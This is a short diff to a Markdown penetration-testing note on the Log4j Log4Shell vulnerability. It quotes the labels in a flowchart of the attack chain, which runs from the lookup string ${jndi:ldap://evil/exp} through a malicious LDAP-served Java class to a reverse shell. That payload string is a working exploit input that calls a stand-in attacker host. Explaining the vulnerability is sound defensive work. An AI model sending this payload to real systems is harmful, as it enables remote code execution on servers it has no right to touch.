@@ -39,11 +39,11 @@ description: Log4j Log4Shell 漏洞全解析——渗透测试实战笔记，含
 
 ```mermaid
 flowchart LR
-    A[${jndi:ldap://evil/exp}] --> B[Log4j 解析]
+    A["${jndi:ldap://evil/exp}"] --> B[Log4j 解析]
     B --> C[JNDI 发起 LDAP 请求]
     C --> D[LDAP Server 返回恶意 Java 类]
     D --> E[目标加载并执行恶意类]
-    E --> F[反弹Shell/命令执行]
+    E --> F["反弹Shell/命令执行"]
 ```
 
 ---
